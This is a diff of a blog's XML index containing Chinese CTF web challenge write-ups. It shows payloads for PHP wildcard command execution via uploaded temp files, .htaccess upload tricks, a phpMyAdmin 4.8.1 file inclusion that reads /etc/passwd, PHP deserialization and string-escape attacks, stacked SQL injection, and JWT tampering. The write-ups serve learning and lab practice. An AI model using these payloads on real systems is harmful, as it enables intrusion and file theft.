-需要先?><p>把前面的&lt;?php给闭合掉</p>
-<p>0x03 通配符与无字母数组命令执行</p>
-<p>既然./exp.txt可以用./??p????代替</p>
-<p>那么我们上传的临时文件phpxxxxx.tmp也可以用php?????.tmp代替</p>
-<p>0x04 解题<br>POST /?cmd=?&gt;&lt;?=<code>.+/??p/p?p??????</code>; HTTP/1.1<br>Host: 47fa7ca7-058a-42ff-b48f-de0382f95387.chall.ctf.show<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Content-Type: multipart/form-data; boundary=—————————10242300956292313528205888<br>Accept-Encoding: gzip, deflate<br>Connection: keep-alive<br>Cookie: UM_distinctid=1739f845e394-0cffbf96840b0c8-4c302d7c-144000-1739f845e3b4e2<br>Upgrade-Insecure-Requests: 1<br>Cache-Control: max-age=0<br>Content-Length: 242</p>
-<p>—————————–10242300956292313528205888<br>Content-Disposition: form-data; name=”fileUpload”; filename=”1.txt”<br>Content-Type: text/plain</p>
-<p>#! /bin/bash</p>
-<p>cat /flag.txt<br>—————————–10242300956292313528205888–<br>0x05 .+/解释<br>我在做这道题的时候对于这个.+/有点不理解，还以为是通配符，后来才知道这里的.居然是个命令。source命令可简写为一个点.。</p>
-<p>linux .(点命令)：读取并且在当前的shell中执行文件中的命令<br>1<br>放个图你们就理解了</p>
-<p>点执行了tmp文件里的内容ls，所以这道题中.就是为了执行我们上传的文件中的cat /flag.txt。</p>
-<p>后记<br>这里的解释在p神的文章里都有，之前没仔细看，血亏，搞的似懂非懂很难受。。</p>
-<p><em><strong>判断服务器类型</strong></em></p>
-<p>看看是不是apache类型</p>
-<p>是就上传.htaccess</p>
-<p><img src="/2022/01/27/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1.png" alt="1">把我们上传的文件等当成php运行</p>
-<p>AddType application/x-httpd-php.jpg</p>
-<p>将jpg文件当成php来执行</p>
-<p>其他的上传.user.ini</p>
-<p><img src="/2022/01/27/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/3.png" alt="3"></p>
-<p>php的上传接受multipart/form-data，然后会将它保存在临时文件中。php.ini中设置的<code>upload_tmp_dir</code>就是这个临时文件的保存目录。linux下默认为<code>/tmp</code>。也就是说，只要是php接收到上传的POST请求，就会保存一个临时文件，如何这个php脚本具有“上传功能”那么它将拷贝走，无论如何当脚本执行结束这个临时文件都会被删除。另外，这个php临时文件在linux系统下的命名规则永远是<code>phpXXXXXX</code></p>
-<p><img src="/2022/01/27/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/2.png" alt="2"></p>
-<p>php临时文件存储在linux系统中的名称规则永远是php后面跟六个随机字母</p>
+    <title>我有一个数据库</title>
+    <url>/2022/02/10/%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
+    <content><![CDATA[<h1 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h1><p>首先进去是遗传乱码</p>
+<p><img src="/2022/02/10/%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/1.png" alt="1"></p>
+<p>应该是编码问题</p>
+<p>看了一下robots.txt</p>
+<p>里面藏了一个东西</p>
+<p><img src="/2022/02/10/%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/2.png" alt="1"></p>
+<p>但是里面好像啥也没有</p>
+<p>还是扫描一下把</p>
+<p>可以看到里面有一个phpmyadmin页面</p>
+<p><img src="/2022/02/10/%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/5.png" alt="1"></p>
+<p>这里右边直接就给数据库版本服务器版本以及phpadmin版本</p>
+<p>找了半天数据库5.5.62也没啥漏洞，最后看了一下phpmyadmin4.8.1有漏洞</p>
+<p>去网上直接用就行了</p>
+<p>简单来说就是</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">一个文件包含漏洞</span><br><span class="line">他必须传入target参数</span><br><span class="line">在后面添加?进行截断</span><br><span class="line">’$target=db_sql.php?/../../被包含文件’</span><br><span class="line">就可以读取到文件</span><br><span class="line">但是windows文件不能用特殊字符可以经过两次编码</span><br><span class="line">这样在最后一个判断的时候就可以判断为db_sql.php符合条件就可以文件包含</span><br></pre></td></tr></table></figure>
+
+<p>直接用他们的脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?target=db_sql.php%253f/../../../../../../etc/passwd </span><br><span class="line">他会包含这个文件，其中target值会被解析成db_sql.php%3f/../../test.txt，因为php会把前面db_sql.php%3f当成目录</span><br><span class="line">所以要多加一个../来跳出此目录，执行后面语句。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/10/%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/3.png" alt="1"></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?target=db_sql.php%253f/../../../../../../flag </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/10/%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/4.png" alt="1"></p>
+<p>拿到flag</p>
 ]]></content>
+      <tags>
+        <tag>GWCTF</tag>
+      </tags>
   </entry>
   <entry>
     <title>文件包含</title>
@@ -641,45 +631,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>王鼎杯2020青龙组AreUSerialz</title>
-    <url>/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/</url>
-    <content><![CDATA[<h1 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h1><p>同样先进去看看发现是一道序列化题目</p>
-<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/1.png" alt="1"></p>
-<p>然后进行代码审计</p>
-<p>注意：这类型题目在进行反序列化时首先调用的是__destruct()魔术方法</p>
-<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/2.png" alt="2"></p>
-<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/5.png" alt="5"></p>
-<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/4.png" alt="4"></p>
-<p>我们可以看到这里上面的2是强比较类型（同类型同大小同数值）而下面是弱比较类型不一定需要类型相同所以要绕过这个if我们可以直接用int类型2</p>
-<p>可以看到我们可以进行文件读取filename就是我们需要读取的文件路径</p>
-<p>我们可以通过php伪协议进行读取</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
-
-<p>所以我们需要改的参数只有op以及filename</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">``protected` `$op``=2;</span><br><span class="line">``protected` `$filename``=``&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;``;</span><br><span class="line">``protected` `$content``;</span><br></pre></td></tr></table></figure>
-
-<p>我们直接进行序列化</p>
-<p>注意class类型序列化时需要先实例化对象</p>
-<p>最后都得到</p>
-<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/8.png" alt="8"></p>
-<p>发现有三个显示不正确的地方</p>
-<p>上网查了一下发现是%00的编码无法通过上面的is_valid函数校验（参考文档：<a class="link" href="https://www.cnblogs.com/Cl0ud/p/12874458.html%EF%BC%89">https://www.cnblogs.com/Cl0ud/p/12874458.html）<i class="fas fa-external-link-alt"></i></a></p>
-<p>最简单的解决办法是将上面类中的对象转换成public类型（因为php7+版本对属性不敏感）</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">public` `$op``=2;</span><br><span class="line">public` `$filename``=``&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;``;</span><br><span class="line">public` `$content``;</span><br></pre></td></tr></table></figure>
-
-<p>最后得到</p>
-<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/7.png" alt="7"></p>
-<p>最后用get方式传进str</p>
-<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/9.png" alt="9"></p>
-<p>最后进行base64解码就行了</p>
-<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/11.png" alt="11"></p>
-<p>flag{242b88d2-1121-4c83-a6e4-7685dc25adfb}</p>
-]]></content>
-      <tags>
-        <tag>网鼎杯</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>极客大挑战HardSQL</title>
     <url>/2022/01/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98HardSQL/</url>
     <content><![CDATA[<h1 id="极客大挑战Hardsql"><a href="#极客大挑战Hardsql" class="headerlink" title="极客大挑战Hardsql"></a>极客大挑战Hardsql</h1><p>// 题目是一个很容易的报错题目</p>
@@ -723,273 +674,115 @@
       </tags>
   </entry>
   <entry>
-    <title>随便注</title>
-    <url>/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/</url>
-    <content><![CDATA[<h1 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h1><p>首先进入题目：</p>
-<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/1.png" alt="1"></p>
-<p>看起来是sql注入先试试看看有啥报错</p>
-<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/2.png" alt="1"></p>
-<p>看起来是单引号字符型漏洞</p>
-<p>测试一下他的列数</p>
-<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/3.png" alt="1"></p>
-<p>4看起来不行</p>
-<p>测试了一下2的时候可以正常回显</p>
-<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/4.png" alt="1"></p>
-<p>所以列数是2，用select看看有没有回显的地方</p>
-<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/5.png" alt="1"></p>
-<p>看到他过滤了很多东西就连命名表都过滤了但是没有过滤符号</p>
-<p>但是没有过滤show所以考虑到堆叠注入</p>
-<p>看一看库</p>
-<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/6.png" alt="1"></p>
-<p>表：</p>
-<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/6.png" alt="1"></p>
-<p>发现其中有两个表</p>
-<p>看看里面有啥</p>
-<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/11.png" alt="1"></p>
-<p>发现单引号不行，测试一下双引号还有反撇号</p>
-<p>发现反撇号`可以</p>
-<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/7.png" alt="1"></p>
-<p><img src="/2022/01/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8/12.png" alt="1"></p>
-<p>可以看到1919这个表这里面含有flag但是输出的时候输出的是words表中的数据</p>
-<p>而这题又屏蔽了一些可以用的函数</p>
-<p>想想其他办法</p>
-<p>我们可以重命名表然后把表中的flag改成id这样查询就可以直接查询到id的数据而id的数据就是flag</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">payload=1&#x27;;RENAME TABLE `words` TO `word1`;RENAME `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100)SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from `words`;#`</span><br></pre></td></tr></table></figure>
+    <title>王鼎杯2020青龙组AreUSerialz</title>
+    <url>/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/</url>
+    <content><![CDATA[<h1 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h1><p>同样先进去看看发现是一道序列化题目</p>
+<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/1.png" alt="1"></p>
+<p>然后进行代码审计</p>
+<p>注意：这类型题目在进行反序列化时首先调用的是__destruct()魔术方法</p>
+<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/2.png" alt="2"></p>
+<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/5.png" alt="5"></p>
+<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/4.png" alt="4"></p>
+<p>我们可以看到这里上面的2是强比较类型（同类型同大小同数值）而下面是弱比较类型不一定需要类型相同所以要绕过这个if我们可以直接用int类型2</p>
+<p>可以看到我们可以进行文件读取filename就是我们需要读取的文件路径</p>
+<p>我们可以通过php伪协议进行读取</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
 
-<p>就可以直接输出flag了</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">flag&#123;39e1f712-9675-492f-9e7a-7cb9ece7ba2f</span><br></pre></td></tr></table></figure>
+<p>所以我们需要改的参数只有op以及filename</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">``protected` `$op``=2;</span><br><span class="line">``protected` `$filename``=``&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;``;</span><br><span class="line">``protected` `$content``;</span><br></pre></td></tr></table></figure>
 
-]]></content>
-  </entry>
-  <entry>
-    <title>蛛蛛...嘿嘿♥我的蛛蛛</title>
-    <url>/2022/02/06/%E8%9B%9B%E8%9B%9B-%E5%98%BF%E5%98%BF%E2%99%A5%E6%88%91%E7%9A%84%E8%9B%9B%E8%9B%9B/</url>
-    <content><![CDATA[<h1 id="蛛蛛…嘿嘿♥我的蛛蛛"><a href="#蛛蛛…嘿嘿♥我的蛛蛛" class="headerlink" title="蛛蛛…嘿嘿♥我的蛛蛛"></a>蛛蛛…嘿嘿♥我的蛛蛛</h1><p>进去之后先看看</p>
-<p><img src="/2022/02/06/%E8%9B%9B%E8%9B%9B-%E5%98%BF%E5%98%BF%E2%99%A5%E6%88%91%E7%9A%84%E8%9B%9B%E8%9B%9B/1.png" alt="1"></p>
-<p>点了一下，发现方框变多但是只有一个是真的</p>
-<p><img src="/2022/02/06/%E8%9B%9B%E8%9B%9B-%E5%98%BF%E5%98%BF%E2%99%A5%E6%88%91%E7%9A%84%E8%9B%9B%E8%9B%9B/2.png" alt="1"></p>
-<p>查看源代码的时候可以看到哪个是真的</p>
-<p>但是一直点也不知道什么时候结束，写一个简单的爬虫脚本方便我们直接得到那个页面</p>
-<p>附上我的脚本：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 开发时间：2022/2/6:16:50</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://hgame-spider.vidar.club/714c5754f1&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    urrl = url + key</span><br><span class="line">    uuu = re.<span class="built_in">compile</span>(<span class="string">&#x27;href=&quot;(.*?)&quot;&#x27;</span>)   <span class="comment">#匹配括号中的内容</span></span><br><span class="line">    r = requests.get(url=urrl)          <span class="comment">#用get方式传入参数</span></span><br><span class="line">    l = re.findall(uuu, r.text)    <span class="comment">#在r.text中匹配UUU规则中的数据</span></span><br><span class="line">    <span class="built_in">print</span>(urrl)                 <span class="comment">#查看访问网址</span></span><br><span class="line">    key = [i <span class="keyword">for</span> i <span class="keyword">in</span> l <span class="keyword">if</span> i != <span class="string">&#x27;&#x27;</span>]  <span class="comment">#从l中提取数据直到他为空</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(key) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        key = key[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
+<p>我们直接进行序列化</p>
+<p>注意class类型序列化时需要先实例化对象</p>
+<p>最后都得到</p>
+<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/8.png" alt="8"></p>
+<p>发现有三个显示不正确的地方</p>
+<p>上网查了一下发现是%00的编码无法通过上面的is_valid函数校验（参考文档：<a class="link" href="https://www.cnblogs.com/Cl0ud/p/12874458.html%EF%BC%89">https://www.cnblogs.com/Cl0ud/p/12874458.html）<i class="fas fa-external-link-alt"></i></a></p>
+<p>最简单的解决办法是将上面类中的对象转换成public类型（因为php7+版本对属性不敏感）</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">public` `$op``=2;</span><br><span class="line">public` `$filename``=``&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;``;</span><br><span class="line">public` `$content``;</span><br></pre></td></tr></table></figure>
 
-<p>直接访问最后一个网页</p>
-<p><img src="/2022/02/06/%E8%9B%9B%E8%9B%9B-%E5%98%BF%E5%98%BF%E2%99%A5%E6%88%91%E7%9A%84%E8%9B%9B%E8%9B%9B/4.png" alt="1"></p>
-<p><img src="/2022/02/06/%E8%9B%9B%E8%9B%9B-%E5%98%BF%E5%98%BF%E2%99%A5%E6%88%91%E7%9A%84%E8%9B%9B%E8%9B%9B/3.png" alt="1"></p>
-<p>最后找flag就简单了慢慢找呗，最后发现flag是在请求头里面</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>easy_auth</title>
-    <url>/2022/02/06/easy-auth/</url>
-    <content><![CDATA[<h1 id="easy-auth"><a href="#easy-auth" class="headerlink" title="easy_auth"></a>easy_auth</h1><p>进去是一个注册登录框：</p>
-<p><img src="/2022/02/06/easy-auth/1.png" alt="1"></p>
-<p>先注册一个admin看看</p>
-<p><img src="/2022/02/06/easy-auth/5.png" alt="1"></p>
-<p>可以看到，admin用户是存在的</p>
-<p>那么有极大的可能就是第一个就是admin</p>
-<p>先随便注册一个进去先看看</p>
-<p><img src="/2022/02/06/easy-auth/2.png" alt="1"></p>
-<p>进入了这个页面</p>
-<p>下面有个对话框可以输入内容</p>
-<p>输入完会显示在网页上</p>
-<p>抓个包，抓doing包试试</p>
-<p><img src="/2022/02/06/easy-auth/3.png" alt="1"></p>
-<p>发过来好几个包，最后一个get包里面发现了我们想要的东西，可以看到我们返回了我的ID以及用户名</p>
-<p>而且我发过去的东西里面附带了一个token</p>
-<p>但是我不知道这视什么解码</p>
-<p>上网查了一下这种格式，非常可能是jwt的sha256解码</p>
-<p>进去看看</p>
-<p><img src="/2022/02/06/easy-auth/9.png" alt="1"></p>
-<p>发现确实是我们返回的内容，那么我们按照之前测试的尝试修改UserName改成admin，ID改成0试试第一个是不是admin</p>
-<p><img src="/2022/02/06/easy-auth/8.png" alt="1"></p>
-<p>好像不太行，但是有返回值，思路应该是对的，ID试试改成1</p>
-<p><img src="/2022/02/06/easy-auth/4.png" alt="1"></p>
-<p>可以看到他成功返回了并且返回了flag</p>
-]]></content>
-      <tags>
-        <tag>hgame</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Tetris plus</title>
-    <url>/2022/02/06/Tetris-plus/</url>
-    <content><![CDATA[<h1 id="Tetris-plus"><a href="#Tetris-plus" class="headerlink" title="Tetris-plus"></a>Tetris-plus</h1><p>进入题目：</p>
-<p>发现是个游戏，先小玩一把。</p>
-<p><img src="/2022/02/06/Tetris-plus/1.png" alt="1"></p>
-<p>到最后也没发现啥问题</p>
-<p>点点别的也都正常</p>
-<p>看看源代码</p>
-<p><img src="/2022/02/06/Tetris-plus/3.png" alt="1"></p>
-<p>都是些不痛不痒的东西，但是包含的js非常多，都点进去看看</p>
-<p>在check.js页面发现他注释了段很长的东西，之前写过的jsfuck</p>
-<p><img src="/2022/02/06/Tetris-plus/2.png" alt="1"></p>
-<p>直接拿去开发者页面去编译一下jsfuck</p>
-<p><img src="/2022/02/06/Tetris-plus/5.png" alt="1"></p>
-<p>就得到了flag拉</p>
-]]></content>
-      <tags>
-        <tag>hgame</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>cybergrabs-easyweb</title>
-    <url>/2022/02/08/cybergrabs-easyweb/</url>
-    <content><![CDATA[<h1 id="easy-web"><a href="#easy-web" class="headerlink" title="easy-web"></a>easy-web</h1><p>进入题目也得先看看</p>
-<p><img src="/2022/02/08/cybergrabs-easyweb/1.png" alt="1"></p>
-<p>啥也没有，源代码也没啥</p>
-<p>抓个包看下（因为他刚进去的时候有的要等响应，抓错几次）</p>
-<p><img src="/2022/02/08/cybergrabs-easyweb/2.png" alt="1"></p>
-<p>可以看到我们传过去一个cookie</p>
-<p>而且从服务器端回传了一个cookie的value值，我们拿到这个值直接去base64解码就可以得到了</p>
-]]></content>
-      <tags>
-        <tag>Cyber Grabs</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>cybergrabs-rabbit</title>
-    <url>/2022/02/08/cybergrabs-rabbit/</url>
-    <content><![CDATA[<h1 id="rabblt"><a href="#rabblt" class="headerlink" title="rabblt"></a>rabblt</h1><p>这道题跟之前的不一样</p>
-<p>在tryhackme网站里开了个攻击机</p>
-<p>我们自己连连不上</p>
-<p>题目提示让我们read flag.txt</p>
-<p>我们可以想到可能是文件读取或者文件包含，让我们直接读到flag.txt之中的内容</p>
-<p>打开之后照常先进网站看看</p>
-<p><img src="/2022/02/08/cybergrabs-rabbit/2.png" alt="1"></p>
-<p>发现这些没有那种类似文件包含的漏洞，</p>
-<p>那么会不会是在根目录下面直接读取flag.txt</p>
-<p>尝试了一下dirsearch，但是攻击机里面没有</p>
-<p>但是前面题目中提示了flag应该是在flag.txt里面</p>
-<p>所以我们直接读取flag.txt试试</p>
-<p><img src="/2022/02/08/cybergrabs-rabbit/3.png" alt="1"></p>
-<p>可以看到可以读取到flag</p>
-<p>提交</p>
-<p><img src="/2022/02/08/cybergrabs-rabbit/4.png" alt="1"></p>
-]]></content>
-      <tags>
-        <tag>Cyber Grabs</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>easy-serialize-php</title>
-    <url>/2022/02/09/easy-serialize-php/</url>
-    <content><![CDATA[<h1 id="安洵杯-easy-serialize-php"><a href="#安洵杯-easy-serialize-php" class="headerlink" title="[安洵杯]easy_serialize_php"></a>[安洵杯]easy_serialize_php</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">题目涉及到序列化漏洞的字符逃逸</span><br><span class="line">因为到后面序列化写不明白，看了一下大佬的wp</span><br><span class="line">（https://www.jianshu.com/p/8e8117f9fd0e）</span><br></pre></td></tr></table></figure>
-
-<p>进入题目有一个链接里面是源码</p>
-<p><img src="/2022/02/09/easy-serialize-php/1.png" alt="1"></p>
-<p>可以看到我们现在是在index.php网页中</p>
-<p>源码中提示在phpinfo里面由我们需要的东西</p>
-<p>进去看看</p>
-<p><img src="/2022/02/09/easy-serialize-php/2.png" alt="1"></p>
-<p>找到了一个子网页，那么就优先考虑到文件读取</p>
-<p>看了一圈只有最后输出的时候又个file_get_contents函数可以读取文件内容，他读取的文件内容是base64解码之后的img</p>
-<p>继续跟踪一下img，发现是由image_path传送进来的，但是我们输入img的时候会被函数过滤，所以img不可控</p>
-<p>找找别的方法，下面有个反序列化函数是我们可以更改的，那么我们是不是可以构造一个我们的文件来赋值给img来直接进行文件读取呢</p>
-<p>首先我们读取的文件base64：ZDBnM19mMWFnLnBocA==那么我们需要读取的内容就是s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”</p>
-<p>但是我上面有个过滤：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">function filter($img)&#123;</span><br><span class="line">    $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;);</span><br><span class="line">    $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;;</span><br><span class="line">    return preg_replace($filter,&#x27;&#x27;,$img);// 在img中的所有的filter含有的字符串替换成空</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>在这里面’php’,’flag’,’php5’,’php4’,’fl1g’会被替换为空</p>
-<p>也就是说</p>
-<p><img src="/2022/02/09/easy-serialize-php/6.png" alt="1"></p>
-<p>这是我们序列化之后的结果，但是经过过滤，它就变成了</p>
-<p><img src="/2022/02/09/easy-serialize-php/7.png" alt="1"></p>
-<p>那么他是否可以继续执行呢？</p>
-<p>这就涉及到字符串逃逸：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;flagflagflagflagflagflag&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<p>因为经过过滤，把flag全部替换为空，所以序列化出现了问题，但是可以看到在替换之后<strong>s:24:” ”</strong>后面的24个字符**;s:8:”function”;s:59:”a“<strong>之后又是一个</strong>“;**直接闭合了，那么它会直接运行</p>
-<p>也就是说我们可以依靠这个过滤直接构造一个img来读取到我们想要读取的文件</p>
-<h4 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">get:f=show_image</span><br><span class="line">post_SESSION[flagflag]=&quot;;s:1:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;</span><br></pre></td></tr></table></figure>
-
-<p>session序列化之后是这样的：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a:1:&#123;s:8:&quot;flagflag&quot;;s:49:&quot;&quot;;s:1:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;</span><br><span class="line">过滤之后：</span><br><span class="line">a:1:&#123;s:8:&quot;&quot;;s:49:&quot;&quot;;s:1:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>过滤之后就是把<strong>a</strong>赋值给了**;s:49:””**后面就是把我们需要输入的内容赋值给img就可以拉</p>
-<p>拿到页面内容：<img src="/2022/02/09/easy-serialize-php/3.png" alt="1"></p>
-<p><img src="/2022/02/09/easy-serialize-php/5.png" alt="1"></p>
-<p>我们直接将刚刚读取的文件名替换成这个就可以得到flag了</p>
-<h3 id="最终payload："><a href="#最终payload：" class="headerlink" title="最终payload："></a>最终payload：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">get:f=show_image</span><br><span class="line">post_SESSION[flagflag]=&quot;;s:1:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>安洵杯</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>网鼎杯朱雀组-easyweb</title>
-    <url>/2022/02/09/%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%9C%B1%E9%9B%80%E7%BB%84-easyweb/</url>
